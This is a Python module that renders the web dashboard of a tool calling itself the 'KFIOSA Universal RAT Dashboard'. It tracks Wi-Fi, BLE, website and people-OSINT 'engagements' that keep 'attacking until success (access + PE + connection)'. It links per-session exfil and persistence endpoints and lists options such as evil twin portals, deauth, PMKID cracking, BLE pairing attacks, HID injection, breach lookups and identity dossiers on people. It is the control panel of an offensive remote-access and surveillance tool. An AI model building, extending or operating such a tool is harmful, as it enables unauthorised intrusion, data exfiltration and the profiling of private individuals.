"""Universal RAT dashboard hub: kind tabs + SQL-backed engagement tasks.

Kinds: wifi · ble · osint_web · osint_people

Polymorphic: actions/cards adapt to kind + task status + achievements.
"""
from __future__ import annotations

import html
import json
import time
from typing import Any, Dict, List, Optional

KINDS = (
    ("wifi", "Wi‑Fi"),
    ("ble", "BLE"),
    ("osint_web", "OSINT Web"),
    ("osint_people", "OSINT People"),
)


def _esc(s: Any) -> str:
    return html.escape(str(s if s is not None else ""), quote=True)


def _sessions_block(sessions: Optional[List[Dict[str, Any]]]) -> str:
    """Active sessions roster with PDF / recommend / stream hooks (v2 contract)."""
    sessions = sessions or []
    if not sessions:
        return (
            '<section class="panel" id="sessions-panel">'
            "<h2>Active sessions</h2>"
            '<p class="hint empty-sessions">No active sessions yet. '
            "Gain access from Wi‑Fi / BLE engagement (ACCEPT-gated), "
            "or create a task below.</p>"
            "</section>"
        )
    rows = []
    for s in sessions:
        sid = (
            s.get("id") or s.get("session_id") or s.get("sid") or "?"
        )
        kind = s.get("kind") or s.get("transport") or "?"
        tgt = s.get("target") or s.get("label") or sid
        rows.append(
            f'<tr data-sid="{_esc(sid)}">'
            f"<td><code>{_esc(sid)}</code></td>"
            f"<td>{_esc(kind)}</td>"
            f"<td>{_esc(tgt)}</td>"
            f'<td class="acts">'
            f'<a class="api" href="/api/session/{_esc(sid)}/report.pdf">'
            f"export PDF</a> · "
            f'<a class="api" href="/api/session/{_esc(sid)}/recommend">'
            f"recommend</a> · "
            f'<a class="api" href="/api/session/{_esc(sid)}/stream">'
            f"stream</a> · "
            f'<a class="api" href="/api/session/{_esc(sid)}/exfil">'
            f"exfil</a> · "
            f'<a class="api" href="/api/session/{_esc(sid)}/persistence">'
            f"persistence</a>"
            f"</td></tr>"
        )
    return (
        '<section class="panel" id="sessions-panel">'
        "<h2>Active sessions</h2>"
        '<p class="hint">Per-session PDF report, recommend, live stream, '
        "exfil queue, and persistence UI.</p>"
        '<table class="tasks"><thead><tr>'
        "<th>ID</th><th>Kind</th><th>Target</th><th>Actions</th>"
        "</tr></thead><tbody>"
        + "\n".join(rows)
        + "</tbody></table></section>"
    )


def hub_html(
    sessions: Optional[List[Dict[str, Any]]] = None,
    tasks: Optional[List[Dict[str, Any]]] = None,
    active_kind: str = "wifi",
) -> str:
    """Render advanced multi-kind RAT shell (self-contained HTML+JS)."""
    sessions = sessions or []
    tasks = tasks or []
    # Group tasks by kind
    by_kind: Dict[str, List[Dict[str, Any]]] = {k: [] for k, _ in KINDS}
    for t in tasks:
        k = (t.get("kind") or "").lower()
        if k in by_kind:
            by_kind[k].append(t)
    # Session counts by kind
    sess_by: Dict[str, int] = {k: 0 for k, _ in KINDS}
    for s in sessions:
        k = (s.get("kind") or s.get("transport") or "").lower()
        if k in ("website", "web"):
            k = "osint_web"
        if k in ("people", "person", "osint_people"):
            k = "osint_people"
        if k in sess_by:
            sess_by[k] += 1

    tabs = []
    for kid, label in KINDS:
        n_t = len(by_kind.get(kid) or [])
        n_s = sess_by.get(kid) or 0
        active = "active" if kid == active_kind else ""
        tabs.append(
            f'<button class="tab {active}" data-kind="{_esc(kid)}" '
            f'onclick="hub.showKind(\'{_esc(kid)}\')">'
            f'{_esc(label)} <span class="badge">{n_t}t/{n_s}s</span></button>'
        )

    panels = []
    for kid, label in KINDS:
        rows = []
        for t in by_kind.get(kid) or []:
            st = t.get("status") or "?"
            tid = t.get("id") or ""
            lab = t.get("label") or tid
            rows.append(
                f'<tr data-tid="{_esc(tid)}">'
                f'<td><code>{_esc(tid[-12:])}</code></td>'
                f'<td>{_esc(lab)}</td>'
                f'<td class="st st-{_esc(st)}">{_esc(st)}</td>'
                f'<td class="acts">'
                f'<button onclick="hub.startTask(\'{_esc(tid)}\')">Run→success</button> '
                f'<button onclick="hub.cancelTask(\'{_esc(tid)}\')">Cancel</button> '
                f'<button onclick="hub.openTask(\'{_esc(tid)}\')">Details</button>'
                f'</td></tr>'
            )
        body = (
            "\n".join(rows)
            if rows
            else '<tr><td colspan="4" class="empty">No tasks yet — create one below.</td></tr>'
        )
        hidden = "" if kid == active_kind else "hidden"
        panels.append(f"""
<section class="panel {hidden}" id="panel-{_esc(kid)}" data-kind="{_esc(kid)}">
  <h2>{_esc(label)} engagements</h2>
  <p class="hint">Each task keeps attacking until <b>success</b> (access + PE + connection),
  or fails honestly. State is stored in SQL and survives TUI restarts.</p>
  <table class="tasks">
    <thead><tr><th>ID</th><th>Target</th><th>Status</th><th>Actions</th></tr></thead>
    <tbody>{body}</tbody>
  </table>
  <form class="new-task" onsubmit="return hub.createTask('{_esc(kid)}', this)">
    <label>Target <input name="target" placeholder="{_esc(_placeholder(kid))}" required></label>
    <label>Label <input name="label" placeholder="optional"></label>
    <button type="submit">+ New task → success</button>
  </form>
  <div class="poly-box">
    <h3>Polymorphic options ({_esc(label)})</h3>
    <div class="poly-grid" id="poly-{_esc(kid)}">{_poly_cards(kid)}</div>
  </div>
</section>
""")

    return f"""<!doctype html>
<html lang="en"><head>
<meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>KFIOSA · Universal RAT Dashboard</title>
<style>
:root {{
  --bg:#0b0f14; --panel:#121820; --line:#1e2a38; --fg:#e6edf3;
  --muted:#8b9bb0; --acc:#3dffa8; --warn:#ffb020; --bad:#ff5c5c;
  --wifi:#4ea1ff; --ble:#b388ff; --web:#ff8a65; --people:#4dd0e1;
}}
* {{ box-sizing:border-box; }}
body {{ margin:0; font-family: ui-sans-serif, system-ui, sans-serif;
  background:var(--bg); color:var(--fg); min-height:100vh; }}
header {{ padding:1rem 1.25rem; border-bottom:1px solid var(--line);
  display:flex; flex-wrap:wrap; gap:.75rem; align-items:center;
  background:linear-gradient(180deg,#101820,#0b0f14); }}
header h1 {{ margin:0; font-size:1.15rem; letter-spacing:.04em; }}
header .sub {{ color:var(--muted); font-size:.85rem; }}
.tabs {{ display:flex; flex-wrap:wrap; gap:.4rem; padding:.75rem 1.25rem;
  border-bottom:1px solid var(--line); background:var(--panel); }}
.tab {{ background:#0e1520; color:var(--fg); border:1px solid var(--line);
  border-radius:999px; padding:.45rem .9rem; cursor:pointer; font-size:.9rem; }}
.tab.active {{ border-color:var(--acc); color:var(--acc);
  box-shadow:0 0 0 1px rgba(61,255,168,.25); }}
.badge {{ background:#1a2433; border-radius:8px; padding:.1rem .35rem;
  font-size:.75rem; color:var(--muted); margin-left:.25rem; }}
main {{ padding:1rem 1.25rem 3rem; max-width:1100px; margin:0 auto; }}
.panel.hidden {{ display:none; }}
h2 {{ margin:0 0 .35rem; font-size:1.2rem; }}
.hint {{ color:var(--muted); font-size:.9rem; margin:.25rem 0 1rem; }}
table.tasks {{ width:100%; border-collapse:collapse; background:var(--panel);
  border:1px solid var(--line); border-radius:10px; overflow:hidden; }}
table.tasks th, table.tasks td {{ padding:.55rem .7rem; border-bottom:1px solid var(--line);
  text-align:left; font-size:.9rem; }}
table.tasks th {{ color:var(--muted); font-weight:600; background:#0e1520; }}
.st-success {{ color:var(--acc); }} .st-running {{ color:var(--warn); }}
.st-failed,.st-cancelled {{ color:var(--bad); }} .st-queued {{ color:var(--muted); }}
.empty {{ color:var(--muted); text-align:center; }}
.acts button, form button {{ background:#152033; color:var(--fg); border:1px solid var(--line);
  border-radius:8px; padding:.35rem .6rem; cursor:pointer; font-size:.8rem; }}
.acts button:hover, form button:hover {{ border-color:var(--acc); color:var(--acc); }}
form.new-task {{ display:flex; flex-wrap:wrap; gap:.6rem; margin:1rem 0;
  padding:1rem; background:var(--panel); border:1px solid var(--line); border-radius:10px; }}
form.new-task label {{ display:flex; flex-direction:column; gap:.25rem; font-size:.8rem; color:var(--muted); }}
form.new-task input {{ background:#0b1018; border:1px solid var(--line); color:var(--fg);
  border-radius:8px; padding:.45rem .6rem; min-width:14rem; }}
.poly-box {{ margin-top:1.5rem; }}
.poly-grid {{ display:grid; grid-template-columns:repeat(auto-fill,minmax(180px,1fr)); gap:.6rem; }}
.poly-card {{ background:var(--panel); border:1px solid var(--line); border-radius:10px;
  padding:.75rem; font-size:.85rem; }}
.poly-card b {{ display:block; margin-bottom:.25rem; color:var(--acc); }}
.poly-card span {{ color:var(--muted); font-size:.78rem; }}
.footer {{ margin-top:2rem; color:var(--muted); font-size:.8rem; }}
#toast {{ position:fixed; bottom:1rem; right:1rem; background:#152033; border:1px solid var(--acc);
  color:var(--fg); padding:.6rem 1rem; border-radius:10px; display:none; z-index:50; }}
a.api {{ color:var(--wifi); }}
</style>
</head><body>
<header>
  <div>
    <h1>KFIOSA · Universal RAT Dashboard</h1>
    <div class="sub">KFIOSA RAT dashboard · control centre · SQL-persisted · polymorphic · until-success</div>
  </div>
  <div class="sub">
    <a class="api" href="/api/v5/health">health</a> ·
    <a class="api" href="/api/sessions">sessions</a> ·
    <a class="api" href="/api/tasks">tasks</a> ·
    <a class="api" href="/api/attack_state">attack state</a> ·
    <a class="api" href="/api/v4/ai_status">AI status</a> ·
    <a class="api" href="/api/v4/scan_options?surface=wifi">scan · wifi</a> ·
    <a class="api" href="/api/sql/snapshot/default">SQL snapshot</a> ·
    <a class="api" href="/api/sql/log/default">SQL log</a> ·
    <a class="api" href="/api/sql/history/default">SQL history</a> ·
    <a class="api" href="/api/sql/exfil/default">SQL exfil</a> ·
    <a class="api" href="/api/sql/sessions">SQL sessions</a> ·
    <a class="api" href="/api/sql_health">SQL health</a> ·
    <a class="api" href="/api/stream">stream</a> ·
    <a class="api" href="/api/recommend">recommend</a> ·
    <a class="api" href="/api/exfil">exfil</a> ·
    <a class="api" href="/api/persistence">persistence</a>
  </div>
</header>
<nav class="tabs">{''.join(tabs)}</nav>
<main>
{_sessions_block(sessions)}
{''.join(panels)}
<p class="footer">Tasks and sessions save to the local SQL store (~/.kfiosa/kfiosa.db by default)
and reconnect when the Python tool / dashboard restarts.</p>
</main>
<div id="toast"></div>
<script>
const hub = {{
  showKind(k) {{
    document.querySelectorAll('.tab').forEach(t => t.classList.toggle('active', t.dataset.kind===k));
    document.querySelectorAll('.panel').forEach(p => p.classList.toggle('hidden', p.dataset.kind!==k));
    history.replaceState(null,'','?kind='+encodeURIComponent(k));
  }},
  toast(msg) {{
    const el = document.getElementById('toast');
    el.textContent = msg; el.style.display='block';
    setTimeout(()=>el.style.display='none', 3200);
  }},
  async createTask(kind, form) {{
    const fd = new FormData(form);
    const targetRaw = (fd.get('target')||'').toString().trim();
    const label = (fd.get('label')||'').toString().trim();
    if (!targetRaw) return false;
    const target = hub._parseTarget(kind, targetRaw);
    try {{
      const r = await fetch('/api/tasks', {{
        method:'POST', headers:{{'Content-Type':'application/json'}},
        body: JSON.stringify({{ kind, target, label, start: true }})
      }});
      const j = await r.json();
      hub.toast(j.ok ? ('Task started: '+(j.task&&j.task.id||'')) : ('Error: '+(j.error||r.status)));
      if (j.ok) setTimeout(()=>location.reload(), 600);
    }} catch(e) {{ hub.toast(String(e)); }}
    return false;
  }},
  _parseTarget(kind, raw) {{
    if (kind==='wifi') {{
      if (raw.includes(':')) return {{ bssid: raw, ssid: raw }};
      return {{ ssid: raw }};
    }}
    if (kind==='ble') {{
      if (raw.includes(':')) return {{ address: raw, name: raw }};
      return {{ name: raw }};
    }}
    if (kind==='osint_web') return {{ url: raw.startsWith('http')? raw : ('https://'+raw) }};
    return {{ query: raw }};
  }},
  async startTask(tid) {{
    const r = await fetch('/api/tasks/'+encodeURIComponent(tid)+'/start', {{method:'POST'}});
    const j = await r.json(); hub.toast(j.ok?'Running until success':'Error: '+(j.error||''));
    if (j.ok) setTimeout(()=>location.reload(), 800);
  }},
  async cancelTask(tid) {{
    const r = await fetch('/api/tasks/'+encodeURIComponent(tid)+'/cancel', {{method:'POST'}});
    const j = await r.json(); hub.toast(j.ok?'Cancelled':'Error');
    if (j.ok) setTimeout(()=>location.reload(), 500);
  }},
  openTask(tid) {{ location.href = '/api/tasks/'+encodeURIComponent(tid); }},
}};
// restore kind from query
(function(){{
  const m = /[?&]kind=([a-z_]+)/.exec(location.search);
  if (m) hub.showKind(m[1]);
  // poll task statuses
  setInterval(async ()=>{{
    try {{
      const r = await fetch('/api/tasks'); const j = await r.json();
      if (!j.ok || !j.tasks) return;
      j.tasks.forEach(t => {{
        const row = document.querySelector('tr[data-tid="'+t.id+'"] td.st');
        if (row) {{ row.textContent = t.status; row.className = 'st st-'+t.status; }}
      }});
    }} catch(e) {{}}
  }}, 4000);
}})();
</script>
</body></html>
"""


def _placeholder(kind: str) -> str:
    return {
        "wifi": "SSID or BSSID aa:bb:…",
        "ble": "Device name or MAC",
        "osint_web": "https://target.example",
        "osint_people": "Name / email / handle",
    }.get(kind, "target")


def _poly_cards(kind: str) -> str:
    """Kind-adaptive polymorphic option cards (UI affordances)."""
    catalogs = {
        "wifi": [
            ("Handshake / PMKID", "Capture then crack path"),
            ("Evil twin / portal", "When clients present"),
            ("WPA3-SAE plan", "PMF-aware adaptive"),
            ("Deauth pivot", "Only if injection OK"),
            ("Post-exploit tail", "Auto on access"),
            ("LAN recon", "After join"),
        ],
        "ble": [
            ("GATT enum", "Services / chars"),
            ("Pairing attack", "When bond possible"),
            ("HID inject", "If HID present"),
            ("Long-range prep", "Adapter tune"),
            ("Post-exploit", "Auto on access"),
            ("Notify sniff", "Read paths"),
        ],
        "osint_web": [
            ("Tech fingerprint", "Headers / stack"),
            ("CVE map", "NVD keywords"),
            ("Form surface", "Auth paths"),
            ("Subdomain fan-out", "If domain"),
            ("Session attach", "Long job"),
            ("Report export", "PDF when ready"),
        ],
        "osint_people": [
            ("Identity graph", "Handles / email"),
            ("Breach surface", "HIBP if keyed"),
            ("Social fan-out", "Public only"),
            ("Phone / geo hints", "When available"),
            ("Profile job", "Until complete"),
            ("Export dossier", "Structured JSON"),
        ],
    }
    cards = catalogs.get(kind) or []
    return "".join(
        f'<div class="poly-card"><b>{_esc(t)}</b><span>{_esc(d)}</span></div>'
        for t, d in cards
    )


def kinds_summary(tasks: List[Dict[str, Any]], sessions: List[Dict[str, Any]]) -> Dict[str, Any]:
    out = {}
    for kid, label in KINDS:
        out[kid] = {
            "label": label,
            "tasks": sum(1 for t in tasks if t.get("kind") == kid),
            "running": sum(
                1 for t in tasks
                if t.get("kind") == kid and t.get("status") == "running"
            ),
            "success": sum(
                1 for t in tasks
                if t.get("kind") == kid and t.get("status") == "success"
            ),
            "sessions": sum(
                1 for s in sessions
                if (s.get("kind") or "").lower() in (kid, kid.replace("osint_", ""))
            ),
        }
    return {"ok": True, "kinds": out, "ts": time.time()}
